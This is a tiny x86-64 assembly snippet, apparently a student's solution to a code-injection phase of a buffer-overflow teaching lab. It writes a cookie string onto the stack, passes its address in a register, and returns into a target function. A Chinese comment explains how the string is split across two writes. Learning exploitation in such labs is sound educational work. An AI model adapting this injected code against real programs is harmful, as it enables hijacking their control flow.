mov $0x5561dd18,%rdi
movq $0x39623935,(%rdi)
movq $0x61663739,0x4(%rdi) #没搞懂它的意思，它的意思很简单，就是把cookie直接变字符串...mov一次只能写这么多，分开两次就行
pushq $0x4018fa
retq
